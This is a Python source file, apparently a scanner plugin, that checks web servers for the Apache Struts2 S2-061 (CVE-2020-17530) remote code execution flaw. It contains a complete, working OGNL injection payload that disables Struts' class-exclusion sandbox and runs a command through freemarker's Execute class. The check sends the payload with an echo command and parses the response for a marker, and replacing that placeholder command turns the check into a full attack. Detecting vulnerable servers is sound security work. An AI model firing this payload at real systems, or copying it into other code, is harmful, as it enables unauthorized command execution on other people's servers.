#!/usr/bin/env python3

import re
from app.lib.request import request
from app.lib.common import get_capta, get_useragent

class S2_061_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'S2-061漏洞,又名CVE-2020-17530漏洞',
            'description': 'Struts2 Remote Code Execution Vulnerability, Struts 2.0.0 - Struts 2.5.25',
            'date': '2020-12-08',
            'exptype': 'check',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        if '.action' not in self.url:
            self.url = self.url + '/index.action'
        self.capta = get_capta()
        self.headers = {
            'User-Agent': get_useragent(),
            'Content-Type': "application/x-www-form-urlencoded"
        }
       
        self.payload = {
            'name': '''%{('Powered_by_Unicode_Potats0,enjoy_it').(#UnicodeSec = #application['org.apache.tomcat.InstanceManager']).(#potats0=#UnicodeSec.newInstance('org.apache.commons.collections.BeanMap')).(#stackvalue=#attr['struts.valueStack']).(#potats0.setBean(#stackvalue)).(#context=#potats0.get('context')).(#potats0.setBean(#context)).(#sm=#potats0.get('memberAccess')).(#emptySet=#UnicodeSec.newInstance('java.util.HashSet')).(#potats0.setBean(#sm)).(#potats0.put('excludedClasses',#emptySet)).(#potats0.put('excludedPackageNames',#emptySet)).(#exec=#UnicodeSec.newInstance('freemarker.template.utility.Execute')).(#cmd={'cmd_data'}).(#res=#exec.exec(#cmd))}''',
            'age': ''
        }
    
    async def check(self):

        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        try:
            check_payload = {
                'name': self.payload['name'].replace('cmd_data', 'echo ' + self.capta),
                'age': ''
            }
            check_req = await request.post(self.url, data = check_payload, headers = self.headers)
            check_str = re.sub('\n', '', await check_req.text())
            result = re.findall('<input type=.text()" name="name" value=".*? id="(.*?)"/>', check_str)
            if self.capta in result[0]:
                return True
            
        except Exception as e:
            # print(e)
            pass
        
if  __name__ == "__main__":
    S2_061 = S2_061_BaseVerify('http://localhost:8080/s2_061_war_exploded/index.action')